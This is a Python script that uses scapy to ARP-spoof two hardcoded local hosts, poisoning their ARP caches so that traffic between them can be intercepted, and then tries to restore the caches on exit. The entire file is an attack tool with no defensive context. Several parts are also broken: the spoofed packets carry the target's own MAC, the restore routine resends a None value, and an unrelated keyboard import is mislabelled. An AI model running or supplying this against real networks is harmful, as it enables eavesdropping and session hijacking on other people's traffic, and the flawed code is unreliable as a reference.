#!/usr/bin/python

import scapy.all as scapy
import keyboard  # added the keyboard module for catching KeyboardInterrupt

def restore(dstip, srcip):
    targetmac = getmac(dstip)
    sourcemac = getmac(srcip)
    packet = scapy.send(scapy.ARP(op=2, pdst=dstip, hwdst=targetmac, psrc=srcip, hwsrc=sourcemac), timeout=2, verbose=False)
    scapy.send(packet, timeout=2, verbose=False)

def getmac(targetip):
    arp_packet = scapy.ARP(pdst=targetip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    finalpacket = broadcast / arp_packet
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return mac

def arpspoof(targetip, spoofip):
    mac = getmac(targetip)
    packet = scapy.ARP(op=2, hwsrc=mac, pdst=targetip, psrc=spoofip)
    scapy.send(packet, timeout=2, verbose=False)

def main():
    try:
        while True:
            arpspoof('192.168.199.1', '192.168.199.5')
            arpspoof('192.168.199.5', '192.168.199.1')
    except KeyboardInterrupt:
        restore('192.168.199.1', '192.168.199.5')
        restore('192.168.199.5', '192.168.199.1')
        print("Exiting...")
        exit(0)

if __name__ == "__main__":
    main()
